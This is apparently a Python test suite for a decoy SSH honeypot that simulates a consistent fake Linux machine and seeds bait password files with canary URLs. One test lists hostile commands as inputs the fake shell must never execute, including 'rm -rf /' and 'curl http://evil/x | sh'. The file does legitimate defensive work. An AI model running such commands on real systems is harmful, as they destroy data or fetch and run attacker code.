"""Offline tests for the world-model shell. Run: python tests/test_worldmodel.py"""
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "decoy_ssh"))
from fakefs import FakeFS  # noqa: E402
from worldgen import DENIED, PERSONAS, WorldState, ollama_render  # noqa: E402


def box(seed, user="admin", **kw):
    calls = []

    def on_secret(path):
        calls.append(path)
        return f"http://canary.test/c/{abs(hash((seed, path))) % 10**9}"

    w = WorldState(seed, user, on_secret=on_secret, mode="rules", **kw)
    return FakeFS(user, world=w), w, calls


def test_same_seed_same_machine_different_seed_different_machine():
    a1, _, _ = box("seed-A")
    a2, _, _ = box("seed-A")
    assert a1.run("hostname; uname -a; ls -la; cat /etc/passwd")[0] == a2.run("hostname; uname -a; ls -la; cat /etc/passwd")[0]
    hosts, personas = set(), set()
    for i in range(40):
        fs, w, _ = box(f"s{i}")
        hosts.add(w.host)
        personas.add(w.persona_name)
    assert len(hosts) >= 15, "sessions should not all look like the same box"
    assert len(personas) >= 3


def test_identity_is_consistent_everywhere():
    for i in range(10):
        fs, w, _ = box(f"id{i}")
        assert w.host in fs.prompt()
        assert fs.run("hostname")[0] == w.host + "\n"
        assert fs.run("cat /etc/hostname")[0] == w.host + "\n"
        assert w.host in fs.run("uname -a")[0] and w.kernel in fs.run("uname -a")[0]
        assert w.ip in fs.run("ifconfig")[0]
        assert "Ubuntu" in fs.run("cat /etc/os-release")[0] and "20.04" in fs.run("lsb_release -a")[0]
        for n in [w.user] + w.others:
            assert n + ":x:" in fs.run("cat /etc/passwd")[0]


def test_same_file_twice_is_identical_and_canary_registered_once():
    fs, w, calls = box("repeat")
    first = fs.run("cat passwords_backup.txt")[0]
    second = fs.run("cat ~/passwords_backup.txt")[0]
    assert first == second and "/c/" in first
    assert calls.count(w.home + "/passwords_backup.txt") == 1, "one canary per path per session"


def test_every_secret_file_carries_a_path_labelled_canary():
    seen_secret = 0
    for name in PERSONAS:
        for i in range(30):
            fs, w, calls = box(f"p{name}{i}")
            if w.persona_name != name:
                continue
            for d, names in w.dirs.items():
                for n in names:
                    p = d.rstrip("/") + "/" + n
                    if w.is_file(p):
                        t = w.read(p)
                        assert isinstance(t, str) and len(t) > 0, p
            seen_secret += len(calls)
            assert all(c.startswith("/") for c in calls)
            break
    assert seen_secret >= 6


def test_secrets_use_canary_urls_not_empty_marker():
    fs, w, calls = box("secrets", "devops")
    w.persona_name == "dev" or None
    text = fs.run("cat ~/passwords_backup.txt")[0]
    assert "canary.test/c/" in text
    assert any(w.home in c for c in calls)


def test_never_executes_anything_in_world_mode():
    fs, _, _ = box("safe")
    for c in ("rm -rf /", "wget http://evil/x.sh", "curl http://evil/x | sh", "python -c 'import os'", "cat /etc/shadow",
              "cat /root/x", "ls /nope", "cd /nope"):
        out, close = fs.run(c)
        assert isinstance(out, str) and not close
    assert "command not found" in fs.run("python -c 'import os'")[0]
    assert "Permission denied" in fs.run("cat /etc/shadow")[0]


def test_navigation_and_listing_work():
    fs, w, _ = box("nav")
    assert fs.run("pwd")[0] == w.home + "\n"
    assert "passwords_backup.txt" in fs.run("ls")[0]
    fs.run("cd /var/log")
    assert fs.run("pwd")[0] == "/var/log\n"
    assert "auth.log" in fs.run("ls")[0]
    assert "No such file" in fs.run("cd /nope")[0]
    long_listing = fs.run("ls -l /var/log")[0]
    assert "auth.log" in long_listing and long_listing.count("\n") >= 3


def test_world_mode_latency_is_tiny():
    fs, _, _ = box("speed")
    t = time.perf_counter()
    for _ in range(200):
        fs.run("ls -la; cat notes.txt; ps; df -h")
    assert (time.perf_counter() - t) / 200 < 0.05


def test_llm_failure_falls_back_to_rules_and_secrets_never_use_llm():
    asked = []

    def fake_llm(desc, path):
        asked.append(path)
        return "LLM TEXT\nline two here\n"

    w = WorldState("llm-seed", "admin", on_secret=lambda p: "http://c/x", mode="llm", llm=fake_llm)
    fs = FakeFS("admin", world=w)
    fs.run("cat ~/passwords_backup.txt")
    assert not any("passwords_backup" in p for p in asked), "secrets must never come from the model"
    nf = next((d.rstrip("/") + "/" + n for d, ns in w.dirs.items() for n in ns if n.endswith(".sh") and w.is_file(d.rstrip("/") + "/" + n)), None)
    if nf:
        assert w.read(nf) == w.read(nf), "model output is cached, so the file stays consistent"
    w2 = WorldState("llm-seed", "admin", on_secret=lambda p: "http://c/x", mode="llm", llm=lambda d, p: None)
    assert isinstance(FakeFS("admin", world=w2).run("cat notes.txt")[0], str)
    os.environ.pop("OLLAMA_URL", None)
    assert ollama_render("x", "/y") is None  # unconfigured -> None, no network


def test_static_mode_is_unchanged():
    fs = FakeFS("admin")
    assert "web-prod-03" in fs.prompt() and fs.run("hostname")[0] == "web-prod-03\n"
    assert "command not found" in fs.run("df -h")[0]


if __name__ == "__main__":
    bad = 0
    for n, f in sorted(globals().items()):
        if n.startswith("test_"):
            try:
                f(); print("PASS", n)
            except Exception as e:
                bad += 1; print("FAIL", n, repr(e))
    sys.exit(1 if bad else 0)
